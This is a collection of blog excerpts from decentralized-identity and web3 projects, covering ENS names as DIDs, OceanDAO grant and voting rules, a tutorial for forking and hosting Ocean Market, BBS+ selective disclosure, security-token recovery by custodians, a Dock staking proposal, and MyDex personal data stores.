href="https://www.w3.org/TR/did-spec-registries/#did-methods">W3C DID registry</a> and are now looking for an appropriate home of the specification for further development. We are happy to donate the specification including the <a href="https://github.com/veramolabs/ens-did-resolver">ens-did-resolver</a> implementation.</p><p>Now, every ENS name can be represented as a DID with no extra steps. The default DID Document will always contain the ENS registry as the public profile service and the current owner of the ENS name as the controller of the DID which already enables use cases such as issuing and proving control of verifiable attestations (i.e. based on W3C Verifiable Credentials) which can be used for sign up and sign&nbsp;in.</p><p>Through the ENS registry, standardized TEXT records (as defined in the <a href="https://github.com/veramolabs/did-ens-spec">did:ens</a> specification) can be added to the ENS name to enable more DID-like features, e.g., encryption, delegation, confidential storage, communication etc.</p><p>For example, to enable encryption for a <a href="https://github.com/veramolabs/did-ens-spec">did:ens</a> DID, just add the following TEXT records to your ENS name (see did:ens:ropsten:<a href="https://app.ens.domains/name/awoie.eth">awoie.eth</a>):</p>ENS Text Records for&nbsp;DIDs<p>You can now use <a href="https://github.com/veramolabs/did-ens-spec">did:ens</a> with <a href="https://veramo.io/">Veramo</a> or the <a href="https://github.com/decentralized-identity/did-resolver">did-resolver</a> in your own projects.</p><p>Using DIDs as a standard representation for Decentralized Identifiers will increase interop and synergies between different platforms, chains, applications and communities.</p><p>Wanna talk about how to use ENS names as DIDs? <a href="https://discord.gg/Er4E5xRdPj">Join our&nbsp;Discord</a></p> <p><a href="https://medium.com/uport/ens-names-are-decentralized-identifiers-dids-724f0c317e4b">ENS names are Decentralized Identifiers (DIDs)</a> was originally published in <a href="https://medium.com/uport">uPort</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>

For example, New Teams (non-outreach) have 60,000 OCEAN available as “air cover” without having to compete against other groups. Beyond that, they have to&nbsp;compete.</p>  60,000 OCEAN for New Teams (non-outreach category)  30,000 OCEAN for New Teams (outreach category)  30,000 OCEAN for Core Tech Initiatives (listed&nbsp;below)  380,000 OCEAN for remaining General&nbsp;Grants  <p>Core Tech Initiatives</p><p>Proposals that work on any of the following fall under the “Core Tech Initiatives” earmark, for air cover when&nbsp;voting.</p>  Enhance Ocean’s Fine-Grained Permissions to support Verifiable Credentials (vs just Ethereum addresses) in allowlist and denylist. (The schema already allows&nbsp;it.)  First-class integration with WebSockets as a data service. It would include a fork of Ocean Provider, plus affordances elsewhere in the&nbsp;stack.  First-class integration with Arweave as a data service. It may already have some support; this needs to be validated. Then the aim is to remove friction and leverage Arweave more fully. It may be as a fork of Ocean Provider, and/or elsewhere in the&nbsp;stack  First-class integration with Filecoin as a data service. It already supports via IPFS; the aim here is to remove friction and leverage Filecoin more fully. It may be as a fork of Ocean Provider, and/or elsewhere in the&nbsp;stack  <p>Burn</p><p>As with DAO Rounds 8, 9, and 10, any remaining funds not granted in Round 11 will be burned. <a href="https://blog.oceanprotocol.com/on-voting-in-oceandao-8f7e07d40e9d">Here’s how burning relates to voting in OceanDAO</a>.</p><p>Rules:</p>  [Earmarked Grants] winners are counted&nbsp;first.  Projects that do not win an [Earmarked Grant] are then considered for funding under the [General Grant] category.  [New] teams are thus eligible to be funded from both [Grant Category].  Returning teams are eligible to be funded from [General&nbsp;Grants].  50% or more “Yes” Votes receive a&nbsp;grant.  Any remaining funds not granted, are&nbsp;burned.  <p>Voting Parameters</p><p>There are 2 major improvements being rolled out for OceanDAO Round 11 via Snapshot. The key concept is that these changes are designed to reduce the impact of whale voters, increase the impact of voter representation, and make the process easier to navigate for all participants.</p><p>Single Ballot:</p>  All Grant Proposals will now be listed in a single voting ballot together (as opposed to each proposal having their own Y/N&nbsp;ballot)  OCEAN can only be used to vote once (as opposed to each proposal’s Y/N ballot being voted on with your full OCEAN&nbsp;amount).  <p>Quadratic Voting&nbsp;(QV):</p>  <a href="https://en.wikipedia.org/wiki/Quadratic_voting">QV</a> balances “one person one vote” (democratic ideal) with “one token one vote” (skin-in-the-game).

Introduction <p>Have you ever thought about monetising the data that your organisation generates? You might imagine that this involves dealing with data brokers, but with Ocean you can sell your data directly to your customers with no third party in-between. Ocean makes this all super easy for you with some pretty cool tech under the&nbsp;hood.</p><p>Using <a href="https://market.oceanprotocol.com/">Ocean Market</a> is already a big improvement on the alternatives that are out there, but it gets even better. Ocean Market is completely open-source and made freely available under the Apache 2 license. This means that you can fork Ocean Market and set up your own data marketplace in just a few steps. This guide will walk you through the process, you’ll be surprised how easy it is. No prior blockchain knowledge is required!</p> 2. Before You&nbsp;Begin <p>If you’re completely unfamiliar with Ocean Market or web3 applications in general, you will benefit from reading these guides&nbsp;first:</p>  To use your clone of Ocean Market, you’ll need a <a href="https://docs.oceanprotocol.com/tutorials/wallets/">wallet</a>. We recommend <a href="https://docs.oceanprotocol.com/tutorials/metamask-setup/">getting set up with metamask</a>.  You’ll also need some <a href="https://docs.oceanprotocol.com/tutorials/wallets-and-ocean-tokens/">Ocean tokens on a testnet</a> to use your marketplace.  When you have the testnet tokens, have a go at <a href="https://docs.oceanprotocol.com/tutorials/marketplace-publish-data-asset/">publishing a data asset</a> on Ocean&nbsp;Market.  Now run through the process of <a href="https://docs.oceanprotocol.com/tutorials/marketplace-consume-data-asset/">consuming a data asset</a> on Ocean&nbsp;Market.   3. Required Prerequisites <p>Make sure that you have all of the necessary prerequisites:</p>  Git. Instructions for installing Git can be found&nbsp;<a href="https://git-scm.com/book/en/v2/Getting-Started-Installing-Git">here</a>.  Node.js can be downloaded from <a href="https://nodejs.org/en/download/">here</a> (we’re using version 16 in this&nbsp;guide)  A decent code editor, such as <a href="https://code.visualstudio.com/">Visual Studio&nbsp;Code</a>  You’ll need a Github account to fork Ocean market via&nbsp;<a href="https://github.com/">Github</a>.  <p>In addition to the above list, knowledge of <a href="https://www.w3schools.com/css/">CSS</a> will help you make a quick start to adjusting the styling and prior experience with <a href="https://reactjs.org/">React</a> will help but isn’t required.</p> 4. Quickstart: Data Marketplace up and running in under 1&nbsp;hour!  4.1 Fork Ocean&nbsp;Market <p>The first step is to log into Github and navigate to <a href="https://github.com/oceanprotocol/market">https://github.com/oceanprotocol/market</a>, you’ll need to log in or create a Github account. Now you need to click “Fork” in the top right-hand corner. If you are a member of an organisation on Github, it will give you the option to clone it into either your personal account or the organisation, choose whichever is suitable for&nbsp;you.</p> 4.2 Clone the market&nbsp;locally <p>Now we need to clone the market fork locally so that we can start making changes to the code. Upon forking Ocean Market, GitHub will take you to the repository page. Here, you should copy the URL of the repository. To do this, click on the green “Code” button and then click the copy icon to copy the HTTPS URL. Make sure that you have git installed and set up and installed on your computer before proceeding, see <a href="https://git-scm.com/book/en/v2/Getting-Started-Installing-Git">this</a> guide if you’re not familiar with&nbsp;git.</p><p>Now you’re ready to make a local clone of your forked version of the Ocean Market. Open up the terminal, or command prompt on Windows. At this point, you may wish to navigate to the directory where you want this repository to live `cd Desktop` for example, but it’s also perfectly fine to clone it in the home directory.</p><p>To clone the repository, enter the following command into your terminal:</p> git clone <a href="https://github.com/your-profile/market.git">https://github.com/your-profile/market.git</a> <p>You need to replace the link with the HTTPS URL that you copied from GitHub. Once you enter the command, you’ll see the percentage completion reported, and then git will let you know when it’s done. Now let’s navigate into the market directory that we have just&nbsp;cloned:</p> cd market  4.3 Install the dependencies <p>Installing the dependencies is a vital step for running the market. It’s a super simple process, thanks to npm (node package manager). Make sure you have node.js installed, otherwise it will fail. In Ocean Market, we use node.js version 16 and it’s highly recommended that you use the&nbsp;same.</p><p>Enter the following command to install the dependencies:</p> npm install <p>This command will take a few minutes to complete and you’ll see some warnings as it runs (no need to worry about the warnings).</p> 4.4 Run your Market fork for the first&nbsp;time <p>At this point, you are ready to run your data marketplace for the first time. This is another straightforward step that requires just one&nbsp;command:</p> npm start <p>The above command will build the development bundle and run it locally. Once it’s complete you should see the following output:</p><p>Great news — your data marketplace has successfully been built and is now running locally. Let’s check it out! Open your browser and navigate to <a href="http://localhost:8000/">http://localhost:8000/</a>. You’ll see that you have a full-on clone of Ocean Market running locally. Give it a go and test out publishing and consuming data assets — everything works!</p><p>That’s all that’s required to get a clone of Ocean market working. The whole process is made simple because your clone can happily use all the smart contracts and backend components that are maintained by Ocean Protocol Foundation.</p><p>So you’ve got a fully functioning data marketplace at this point, which is pretty cool. But it doesn’t really look like your data marketplace. Right now it’s still just a clone of Ocean Market — same branding, name, logo etc. The next few steps focus on personalising your data marketplace.</p> 4.5 Change your Market&nbsp;Name <p>It’s now time to open up your favourite code editor and start getting stuck into the code. The first thing we will be doing is changing the name of your data marketplace. A decent code editor (such as VS Code) makes this incredibly simple by searching and replacing all the places that the name&nbsp;appears.</p><p>Let’s start by searching and replacing “Ocean Marketplace”. In VS Code there is a magnifying glass symbol in the left-hand panel (arrow 1 in the image below) that will open up the interface for searching and replacing text. Type “Ocean Marketplace” into the first textbox, and the name of your marketplace into the second textbox (arrow 2). To make things simple, there is a button to the right of the second textbox (arrow 3) that will replace all instances at once. You can take a moment to review all the text you’re changing if you wish and then click this&nbsp;button.</p><p>Next up, we need to repeat the process but this time we’ll be searching and replacing “Ocean Market”. As you can see in the screenshot below, we have called our fork “Formidable Data&nbsp;Market”.</p><p>Now let’s change the tagline of your site. Open up the folder called “content” and then open the file called “site.json”.</p><p>On line 4 in this file, you can enter the tagline that you want for your data marketplace.</p> 4.6 Change the&nbsp;Logo <p>The next important step to personalising your data marketplace is setting your own logo, we highly recommend using your logo in SVG format for this. The site logo is stored in the following location:</p> src/images/logo.svg <p>Delete the “logo.svg” file from that folder and paste your own logo in the same folder. If you rename your logo “logo.svg” everything will work without any problems.</p><p>At this point, it’s a good idea to check how things are looking. First, check that you have saved all of your changes, then cancel the build that’s running in your terminal (Ctrl + C or Cmnd + C) and start it again `npm start`. Once the build has finished, navigate to <a href="http://localhost:8000/">http://localhost:8000/</a> and see how things&nbsp;look.</p><p>As you can see in the screenshot above, changing the site name and tagline has worked well. However, our logo doesn’t look quite right… To fix this, open up the Logo.module.css file from src/components/atoms/Logo.module.css. In this file, you can see the styling that is being applied to your&nbsp;logo.</p><p>Delete lines 7, 8 and 9 and save the file. Now open up <a href="http://localhost:8000/">http://localhost:8000/</a>and refresh the page (no need to restart the build&nbsp;here).</p><p>Awesome! Now our logo is fixed and looking&nbsp;great.</p> 4.7 Change the&nbsp;Styling <p>Hopefully, you like our pink and purple branding but we don’t expect you to keep it in your own data marketplace. This step focuses on applying your own brand colours and&nbsp;styles.</p><p>4.7.1 Background</p><p>Let’s start with the background. Open up the following CSS&nbsp;file:</p> src/components/App.module.css <p>You’ll notice in the screenshot above that we are setting our “wave” background on line 3. Here, you’ll want to use your own background colour or image. For this example, we’ll use an SVG background from <a href="https://www.svgbackgrounds.com/">svgbackgrounds.com</a>. We save the new background image into the src/images/ folder (same folder as the logo), then we change the CSS to the file location of the new background (see line 3 in the image&nbsp;below).</p><p>If we save this file and view the site at this point, we get an ugly white section at the top (see image&nbsp;below).</p><p>To fix this we need to change the starting position of the background image. In this situation, we can just delete “13.rem” from line&nbsp;3.</p><p>Now when we view our data marketplace we can see that the new background starts at the top and fills the whole page.&nbsp;Perfect!</p><p>4.7.2 Brand&nbsp;Colours</p><p>Next up, let’s change the background colours to match your individual style. Open up the following file: src/global/_variables.css. Here you’ll see the global style colours that are set. Now is the time to get creative, or consult your brand handbook (if you already have&nbsp;one).</p><p>You can change these colours as much as you wish until you’re happy with how everything looks. Each time you save your changes, the site will immediately update so you can see how things look. You can see the styles chosen for this example in the image&nbsp;below.</p><p>And the screenshot below shows how it’s currently looking.</p><p>4.7.3 Change&nbsp;Fonts</p><p>The final part of the styling that we’ll alter in this guide is the fonts. This is an important step because the font used in Ocean Market is one of the few elements of the market that are copyright protected, if you want to use the same font you’ll need to purchase a license. The other copyrighted elements are the logo and the name — which we have already&nbsp;changed.</p><p>If you don’t already have a brand font, head over to <a href="https://fonts.google.com/">Google Fonts</a> to pick some fonts that suit the brand you’re trying to create. Google makes it nice and easy to see how they’ll look and it’s simple to import them into your&nbsp;project.</p><p>The global fonts are set in the same file as the colours, scroll down and you’ll see them on lines 36 to&nbsp;41.</p><p>If you are importing fonts, such as from Google fonts, you need to make sure that you include the import statement at the top of the _variables.css file (Google Fonts provides you with this import statement so you just need to copy and paste&nbsp;it).</p><p>As with the colour changes, it’s a good idea to save the file with each change and check if the site is looking the way that you expected it to. You can see our eclectic choices&nbsp;below.</p><p>4.8 Change the Fee&nbsp;Address</p><p>At this point, we have made a lot of changes and hopefully you’re happy with the way that your data marketplace is looking. Given that you now have your own awesome data marketplace, it’s about time we talked about monetizing it. Yeah, that’s right — you will earn a commission when people buy and sell data assets on your marketplace.</p><p>When someone sets the pricing for their data assets in your marketplace they are informed that a commission will be sent to the owner of the data marketplace. In order to receive this commission, you need to set the market to send the commission through to your Ethereum&nbsp;address.</p><p>This important step is the last thing that we will change in this guide. To change the address that the marketplace fees are sent to you need to set your address as an environmental variable. Create a new file called&nbsp;.env in the root of your repository. It is important that the file is saved in the right place, your file structure should look the same as&nbsp;below.</p><p>Now copy and paste the following into the&nbsp;file:</p> GATSBY_MARKET_FEE_ADDRESS=”0xxx” <p>You need to replace “0xxx” with your Ethereum address and save the file. And that’s it, you now have a fully functioning data marketplace that will earn you revenue every time someone uses&nbsp;it.</p> 4.9 Build and host your Data Marketplace <p>All that’s left is for you to host your data marketplace and start sharing it with your future users. To host your data marketplace you need to run the build&nbsp;command:</p> npm run build <p>This takes a few minutes to run. While this is running you can get prepared to host your new data marketplace. You have many options for hosting your data marketplace (including AWS S3, Vercel, Netlify and many more). In this guide, we will demonstrate how to host it with <a href="https://surge.sh/">surge</a>, which is completely free and very easy to&nbsp;use.</p><p>Open up a new terminal window and run the following command to install&nbsp;surge:</p> npm install — global surge <p>When this is complete, navigate back to the terminal window that is building your finished data marketplace. Once, the build is completed enter the following commands to enter the public directory and host&nbsp;it:</p> cd public  Surge <p>If this is your first time using surge, you will be prompted to enter an email address and password to create a free account. It will ask you to confirm the directory that it is about to publish, check that you are in the market/public/ directory and press enter to proceed. Now it gives you the option to choose the domain that you want your project to be available on. We have chosen <a href="https://formidable-data-market.surge.sh/">formidable-data-market.surge.sh</a> which is a free option. You can also set a CNAME value in your DNS to make use of your own <a href="https://surge.sh/help/adding-a-custom-domain">custom&nbsp;domain</a>.</p><p>After a few minutes, your upload will be complete and you’re ready to share your data marketplace. You can view the version we created in this guide&nbsp;<a href="https://formidable-data-market.surge.sh/">here</a>.</p> 5. Conclusion <p>Well done for making it to the end of this guide. We’ve covered all of the most important steps for getting your own data marketplace setup:</p>  Forking Ocean&nbsp;Market  Changing the&nbsp;Logo  Setting the name and tagline for your data marketplace.  Customising the styling using your own fonts, colours and background.  Setting your own Ethereum address as an environmental variable to receive the marketplace fees.  Building and publishing your data marketplace.  <p>Hopefully you’ve enjoyed this guide and found it productive.

<p>Vince walks into a casino and the security at the entrance wants to know if Vince is over 21 years old, as that’s the rule to legally play in the&nbsp;casinos.</p><p>Now, Vince is in a dilemma. He wants to prove that he is over 21 years old, but doesn’t want to disclose any other information to the security such as his name or address. How can he do&nbsp;that?</p><p>For starters, it is not possible through physical IDs such as your driver’s license or passport as they will have your name on it. So, how can Vince prove his age without disclosing any other personal information?</p><p>Think about it for a&nbsp;moment.</p><p>This is where <a href="https://academy.affinidi.com/selective-disclosure-share-what-you-want-8ae367655b7b">selective disclosure</a> comes into play.&nbsp;.</p> What is Selective Disclosure? <p>Selective disclosure is one of the pillars of <a href="https://academy.affinidi.com/self-sovereign-identity-what-you-can-cant-do-with-ssi-1284f7227b4e">Self-Sovereign Identity</a> and it enables individuals to share just what is needed by the recipient to process the data and take actions based on&nbsp;it.</p><p>In the above example, selective disclosure allows Vince to share just his age with the security as that alone is enough to decide if he should be allowed to enter the casino or&nbsp;not.</p> Benefits of Selective Disclosure <p>The benefits of selective disclosure are:</p>  Enhances the privacy of the user as minimum information is exchanged  Empowers users to determine what data must be shared with&nbsp;whom.  Reduces processing time for the recipients as only a small set of information has to be verified.  No storing and the related <a href="https://academy.affinidi.com/can-ssi-safeguard-your-information-from-hackers-1b256d3eb6cd">security</a> hassles for recipients  <p>Now that you know what selective disclosure is and its associated benefits, let’s jump to its implementation.</p> How Does Selective Disclosure Work? <p>One of the best ways to implement selective disclosure is through <a href="https://academy.affinidi.com/what-are-verifiable-credentials-79f1846a7b9">Verifiable Credentials (VCs)</a>, a tamper-proof and cryptographically-verifiable way of sharing Personally Identifiable Information.</p><p>Here is what a VC looks&nbsp;like.</p><p>There are three entities to a VC and they are issuer, holder, and verifier, and together, they form what’s called a <a href="https://academy.affinidi.com/what-is-the-trust-triangle-9a9caf36b321">trust triangle</a>. A VC will have the three key components, namely,</p>  Metadata that identifies the issuer and the&nbsp;holder  Claim, which is the data that a holder wants to share with the&nbsp;verifier  Proof that includes digital signatures of both the issuer and the holder for authenticity.  <p>Let’s look closely at the claim, as this is where selective disclosure is implemented.</p><p>In the above example, there is only a single claim, that the holder is an alumni of a specific institution.</p><p>Let’s look at another&nbsp;VC.</p> {  <a href="http://twitter.com/context">“@context</a>”: [<br>     <br>   <a href="http://schema.org/">“http://schema.org/</a>",<br>   <a href="https://w3id.org/security/v2">“https://w3id.org/security/v2</a>",<br>   <a href="https://w3id.org/security/bbs/v1">“https://w3id.org/security/bbs/v1</a>"  ],  <a href="http://twitter.com/type">“@type</a>”: “Person”,  “firstName”: “Jane”,  “lastName”: “Doe”,  “jobTitle”: “Professor”,  “telephone”: “(425) 123–4567”,  “email”: “jane.doe@example.com”,  “proof”: {     “type”: “BbsBlsSignature2020”,     “created”: “2020–04–25”,     “verificationMethod”: “did:example:489398593#test”,     “proofPurpose”: “assertionMethod”,     “proofValue”:   “F9uMuJzNBqj4j+HPTvWjUN/MNoe6KRH0818WkvDn2Sf7kg1P17YpNyzSB+CH57AWDFunU13tL8oTBDpBhODckelTxHIaEfG0rNmqmjK6DOs0/ObksTZh7W3OTbqfD2h4C/wqqMQHSWdXXnojwyFDEg==”,     “requiredRevealStatements”: [4,5]   }  } <p>This contains a ton of information about the holder such as firstname, last name, job title, email, etc. Many times, the holder may not have to share all this information with potential verifiers. At the same time, an issuer may find it cost-effective and convenient to issue these credentials in one&nbsp;go.</p><p>So, how do you balance between what the issuer offers and what the holder&nbsp;wants?</p><p>You guessed it — selective disclosure!</p><p>When an issuer creates and sends a verifiable credential, the holder stores it in his or her digital wallet. When it is time to share it with the verifier, the holder compiles the required credentials together into a verifiable presentation and sends it to the verifier.</p><p>Every time, when a holder shares a verifiable presentation with the verifier, he or she digitally signs it using public-key cryptography. Essentially, the holder signs with his or her private key and the verifier decrypts this information with the associated public&nbsp;key.</p><p>Likewise, the verifiable presentation will also contain the issuer’s digital signature that is signed using its private&nbsp;key.</p><p>Now, you may wonder how the holder can store each credential separately and compile it separately to have the issuer’s signature on each of&nbsp;it.</p><p>To make the question clear, in the above example, let’s say the holder shares only the phone number with a verifier. This is selective disclosure. But how will the issuer’s signature that applies to all of the credentials can be used for just one? Isn’t it a single block of content to which the entire signature applies?</p><p>Well, that’s where <a href="https://academy.affinidi.com/deciphering-bbs-signatures-e853bbf437bf">BBS+ signatures</a> come&nbsp;in.</p> Implementing Selective Disclosure using BBS+ signatures <p>BBS+ signatures are a good way to implement selective disclosure as it allows the holder to share a part of a verifiable credential with a verifier.</p><p>The above verifiable credential of Jane Doe is an example of selective disclosure as it uses BBS+ signatures. Here is the line that shows this for&nbsp;you.</p> “type”: “BbsBlsSignature2020”, <p>As a result, the holder can send just her phone number to a verifier, her email address to another entity, and so on, and all of it will have the same digital signature.</p> Affinidi’s Implementation of Selective Disclosure <p>At Affinidi, we have implemented the BBS group signature schema on our <a href="https://www.affinidi.com/api#">tech stack</a> to give holders the flexibility to build a presentation with only the required fields from a credential. These fragments are cryptographically verifiable as they are signed by the BBS+ signature.</p><p>Specifically, we have created an API to create and share the URL for the VC fragment.</p><p>The createShareUrl is the API that enables selective disclosure in Affinidi’s tech stack. It takes credentialID as a required parameter and optional selective disclosure fields array to build fragment VCs. Of course, the chosen VC should support selective disclosure.</p><p>If this parameter is provided and the VC supports selective disclosure — the fragment from VC will be builded first and then shareUrl will be created for&nbsp;it.</p><p>To learn more about this API and how you can leverage, reach out to us on Discord or email us.

			<p>The digital asset space continues to thrive and attract institutional investors, as according to PitchBook, <a href="https://www.bloomberg.com/news/articles/2021-06-18/venture-capital-makes-a-record-17-billion-bet-on-crypto-world?sref=3REHEaVI">$17 billion worth of institutional capital</a> has poured into the sector this year alone. Moreover, <a href="https://www.bloomberg.com/news/articles/2021-06-18/venture-capital-makes-a-record-17-billion-bet-on-crypto-world?sref=3REHEaVI">70% of institutional investors expect to invest in digital assets</a> in the future. Since the funding in the space has exploded, traditional custodians are trying to figure out how they fit in as new players on this value chain. Custodian banks have been slow to adapt and are now struggling with managing digital asset custody. Even worse, they mix up crypto-currencies and tokenized financial securities.</p>
 Digital assets: new opportunities for custodians 
<p>It is natural that custodians need time to understand how blockchain technology works. Once that happens, the lucrative opportunities that await on the other side will become clear. Here, we listed a few benefits and opportunities:</p>
 
 New safekeeping service<br>
 
 
<p>As digital wallets are the access points for digital assets, custodians can provide custodial wallets for investors.</p>
 
 Reduced operational costs<br>
 
 
<p>When all investor positions are kept on the blockchain, it eliminates the need for reconciliation of depository in the process. This reduces the heavy reconciliation costs.</p>
 
 Immediate services<br>
 
 
<p>Custodians can provide immediate value-added services such as owning the recovery process for lost security tokens, reporting, tax certification, lending services and other collateral management services to investors.</p>
<p>We used the word ‘immediate’ because with the blockchain, processing these services will use a single truth of information. Issuers, agents and investors can access the real-time data at any time. Services can be provided promptly by avoiding the lengthy process of flowing information throughout the traditional chain of custody and the risk of human errors.</p>
 The main challenge is not regulation but the adoption of the new model&nbsp; 
<p>People often think the main challenge in this space is regulation, but it is actually not true. Instead, the real struggle for financial institutions including custodians is adopting new processes and new tools. When it comes to compliance, it is mostly about verifying the eligibility of investors. This can’t be performed by identifying investor wallets, as they are browsers for the internet of value, not vaults.&nbsp; That is where digital identity comes into play, but how does it work? Let’s take a look at the main characteristics in the blockchain-based model of custody to provide some clarity:</p>
 
 Smart contracts<br>
 
 
<p>The smart contracts represent the asset(s) on the blockchain infrastructure. They code compliance rules into the security tokens, and only eligible investors can hold these tokens. The serious protocols for tokenized securities usually include a token recovery function that can be triggered by authorized agents.</p>
 
 Tokens<br>
 
 
<p>The tokens that have eligibility rules embedded into themselves are permissioned tokens, and they can only be traded between eligible counterparts.</p>
 
 Digital identity 
 
<p>Investors have a digital identity that stores verified identity proofs onchain, and smart contracts can check these proofs to verify the eligibility of investors.</p>
 
 Wallets<br>
 
 
<p>Once the smart contract code confirms the eligibility of the investor, the permissioned tokens will be allocated to wallets associated with the investor’s digital identity. If the private key or access credential is lost, the permissioned tokens can be recoverable to another wallet. This can be processed after the verification of identity by token issuers or third-party agents.</p>
<p>&nbsp;</p>
 Use cases: recovery of security tokens 
<p>It is therefore obvious that custodians need access to the token smart contracts, not to the wallets, for safekeeping investors’ assets. For example, issuers of tokenized securities using the <a href="https://tokeny.com/t-rex/">T-REX Protocol, now recognized as ERC3643 by the Ethereum community,</a> are able to appoint a custodian bank as the recovery agent and grant that bank access to the recovery function of the smart contracts. In practice, the security tokens can be recovered in just a few steps:</p>
 
 Declare the loss of the wallet: The investor creates a request to recover their tokens to the custodian bank. 
 Verify the digital identity – <a href="https://tokeny.com/onchainid/">ONCHAINID</a>: The custodian bank verifies the token holder’s identity with a standardized KYC process to validate the provenance of the request. 
 Recover the same tokens in the new wallet: If the verification is positive, the custodian bank triggers the recovery function and the lost tokens are transferred to the new investor wallet. This new wallet will also be added to the ONCHAINID of the investor. The custodian can perform this operation even if he doesn’t have access to the investor’s wallet. 
 
<p></p>
 Time to embrace and explore the new technology&nbsp; 
<p>Traditional custodians have an important role to play in digital asset custody, but they need an updated approach. There are some quick actors who are already reacting to it and updating their model. Recently, US custodian bank State Street launched a digital finance division to expand into the space. Why? It was because of client demand. Certainly, the demand will continue to increase, and as we mentioned earlier, seven out of ten institutional investors plan to invest in digital assets.</p>
<p>The good thing is that the technology has matured after years of use and securing billions worth of digital assets. Custodians can implement the technology quickly and straightforwardly. It is time to move and keep up with technology in order to gain a competitive advantage, those who react slower risk falling behind the competition, or other new players enter into this space.</p>
<blockquote>
<p>As Nadine Chakar, the lead of the new digital finance division at State Street, said, “This space is evolving at warp speed. I believe the winners will be those who embrace change versus those who stand back and watch – they will be disintermediated or disrupted. Business leaders, including myself, must set the tone that standing still is not an option.”</p>
</blockquote>

<p>A new proposal has been submitted to adjust the staking rewards emissions on the Dock network to a 50/50 split with 50% of emission rewards going to validators and stakers, and 50% going to the Dock Treasury.</p><p>This would increase the amount of staking rewards to validators and stakers who participate in securing the Dock network, who are currently receiving 40% of rewards and reduce the Treasury’s allocation from 60%. The initial division of staking rewards was based on Polkadot’s reward split, but we feel that adjusting to a 50/50 split is a better fit to align incentives across the network, increasing the rewards to validators while adequately funding the Dock Treasury to develop and operate the network.<br><br>This proposal is live on the Dock Network and can be viewed in the Governance portal here: ​​<a href="https://fe.dock.io/#/democracy">https://fe.dock.io/#/democracy</a>. All Dock token holders can vote to influence the outcome of this proposal and should participate in determining this important change to the network.</p> How to vote   Go to the <a href="https://fe.dock.io/#/democracy">Governance portal</a> where you will see the Referendum. Click Vote on the proposed Referendum.  <p>2. 	Select which account you want to use to submit the vote and click 	Aye or Nay. Select a Conviction amount which lets you choose to lock-up tokens in order to put more weight behind your vote. You can also chose to not lock-up your tokens as part of the vote.</p><p>Once the voting period ends as shown in the Governance portal, if the referendum passes, then it will move to be executed by the Association Council.

<p>We believe individuals should be able to access and use their own data to be able to manage their lives better. Currently, this isn’t possible because every individual’s data is dispersed across dozens (probably over a hundred) different organisations that hold it and don’t make it available. This is absurd and&nbsp;unfair.</p><p>Over the last 14 years we have built the infrastructure needed to make citizen data empowerment possible — infrastructure capable of providing every individual with their own personal data store, where they can safely and securely collect their own data, use it and share it under their own control. This infrastructure is now live and operational, officially recognised as a supplier to public services on procurement platforms in both England and Scotland and independently accredited for data management security under ISO&nbsp;27001.</p> Unleashing the potential <p>But what we’ve also learned over these 14 years is that core infrastructure is not enough. A parallel: it is extraordinary and wonderful that we have water infrastructure that brings fresh, safe water to our homes and offices, and a national grid that does the same with electricity. But if we didn’t have taps and switches to turn the water and electricity on and off as and when we need them, they wouldn’t be half as valuable as they&nbsp;are.</p><p>So, over the past few years, we’ve also been building the taps and switches that are needed to make our citizen empowering personal data logistics infrastructure really useful. This blog outlines some of&nbsp;them.</p> Smart directories <p>One of the really big, time consuming, frustrating and expensive things every individual and every organisation has to contend with is what we call ‘matching and connecting’. Individuals want to find the services they need to help them with a particular task, but often they don’t know who they are or where to find them. They might not even know that such services exist. Likewise, organisations offering a particular service often struggle to find and reach the particular people who really want or need this&nbsp;service.</p><p>A huge amount of time, money and effort is wasted by both individuals and organisations trying to solve these puzzles, often in expensive and unsatisfactory ways.</p><p>With smart directories, individuals can allow selected organisations to see an anonymised profile of themselves (shorn of any data that would identify the particular individual), and the selected organisations can see whether individuals fit the criteria their service is designed for. If there is a fit, the organisation can use the platform to send a message to the individual. If the individual decides to accept the message and respond, a connection is established.</p><p>Smart Directories lie at the heart of <a href="https://medium.com/mydex/supporting-citizen-participation-in-the-design-of-public-services-d3a56e6aa97">the work we are currently doing</a> with the <a href="https://blogs.gov.scot/digital/tag/office-of-the-chief-designer/">Office of the Chief Designer in Scotland</a> and <a href="https://connecting.scot/">Connecting Scotland</a> to radically reduce the costs of finding and working with citizens to help co-design public services.</p> Automated form&nbsp;filling <p>There is little more dispiriting and irritating than having to fill in forms, especially when you have to do it time and time again, providing the same information to different people. Using our platform and its ability to enable the sharing of <a href="https://medium.com/mydex/proving-verified-attributes-work-3f9ca813d43f">verified attributes</a> in particular, if an individual says ‘Yes, I would like this service’ it is possible for the necessary information (and only the necessary information) to be automatically sucked out of their PDS and sent to the service provider so that service provider doesn’t have to waste time, money and effort checking to see if it is&nbsp;correct.</p><p>This eliminates friction, effort, risk and cost for both sides while radically speeding up the process. Using our infrastructure, what used to take weeks or months (the individual painstakingly and manually filling out a form; the organisation painstakingly checking every piece of information within the form — often having to pay external service providers for the privilege), can now take&nbsp;minutes.</p><p>This approach is central to the Scottish Government’s planned <a href="https://digitalscot.net/courses/digital-government/lessons/digital-identity/topic/digital-identity-scotland-scottish-attribute-provider-service/">Scottish Attribute Provider Service</a>, which could revolutionise both citizens’ experience of accessing and using public services in Scotland and the costs these services&nbsp;incur.</p> Circles <p>In many service situations, different groups of people need to talk to each other to make arrangements, coordinate diaries, deal with changes, share results of meetings, organise follow ups, and so on. Often this is done by phone or email where the information gets lost or becomes difficult to find and where separate processes are then needed to share associated data.</p><p>To address this need, we have created what we call ‘Circle’ capabilities by which an individual can create a specific circle of contacts for a particular need (a bit like a WhatsApp group) but where a) all data generated by the conversation is automatically recorded into the individual’s PDS and b) where if related information needs to be shared it can be, automatically, again via the individual’s PDS.</p><p>Individuals having to manage their cancer journeys provide a good example. Each cancer journey requires a lot of organisation and coordination, with different groups of people for different purposes. For example, the patient will need to arrange and attend appointments and share clinical data with medics; to coordinate arrangements with carers (both paid and unpaid); to manage related domestic arrangements with friends and family (can someone walk the dog while I’m recovering from chemo?); and to connect with specialist service providers.</p><p>In our work with <a href="https://medium.com/macmillan-my-data-store-pilot">Macmillan My Data Store</a>, we have created specific Circles (e.g. for friends and family or small service providers) where all of these tasks can be undertaken safely and efficiently, thereby lifting an energy and emotional burden off cancer patients while helping service providers work more productively.</p><p>The same core technologies are now also being used in the <a href="https://medium.com/mydex/revolutionising-healthy-ageing-200a7edd1016">Revolutionising Healthy Ageing</a> project, where multiple different service providers need to come together to create an integrated, joined-up service for citizens that deals safely and respectfully with multiple aspects of their&nbsp;lives.</p> Web apps 